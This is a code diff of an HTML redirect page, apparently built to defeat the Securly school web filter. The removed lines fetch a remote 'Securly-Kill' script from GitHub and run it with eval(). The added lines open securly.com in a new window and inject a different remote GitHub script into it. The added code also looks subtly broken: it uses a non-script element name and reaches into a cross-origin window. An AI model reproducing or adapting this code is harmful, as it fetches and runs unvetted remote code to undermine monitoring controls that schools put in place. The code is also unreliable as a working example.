@@ -3,34 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirect and Execute Script</title>
+    <title>Redirecting</title>
     <script>
-    // URL of the external script to inject
-    const externalScriptUrl = "https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js";
+        // Wait for the page to load
+        window.addEventListener('load', () => {
+            const redirectUrl = 'https://securly.com';
+            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
-    // Function to load and execute the external script
-    function loadExternalScript(url) {
-        fetch(url)
-            .then(response => response.text())
-            .then(script => {
-                console.log("Injecting external script...");
-                eval(script); // Execute the script content
-            })
-            .catch(error => console.error("Failed to load the external script:", error));
-    }
+            // Open a new about:blank window
+            const newWindow = window.open('about:blank', '_blank', 'width=500,height=300');
 
-    // Monitor the current URL for changes
-    const currentUrl = window.location.href;
-    const checkForRedirect = setInterval(() => {
-        if (window.location.href !== currentUrl) {
-            clearInterval(checkForRedirect); // Stop monitoring
-            console.log("Redirect detected! Executing script on redirected page...");
-            loadExternalScript(externalScriptUrl); // Inject the external script
-        }
-    }, 100); // Check every 100ms
+            // Redirect to the new URL and track it
+            newWindow.location.href = redirectUrl;
+
+            // Listen for the 'load' event after redirection
+            newWindow.addEventListener('load', () => {
+                setTimeout(() => {
+                    fetch(scriptUrl)
+                        .then(response => response.text())
+                        .then(scriptContent => {
+                            for (let i = 0; i < 3; i++) {
+                                const scriptElement = newWindow.document.createElement('script123456');
+                                scriptElement.textContent = scriptContent;
+                                newWindow.document.body.appendChild(scriptElement);
+                            }
+                        })
+                        .catch(error => console.error('Error loading script:', error));
+                }, 1000); // 1 second delay
+            });
+        });
     </script>
 </head>
 <body>
-    <h1>Redirecting to Securly...</h1>
+    <h1>Redirecting...</h1>
 </body>
 </html>
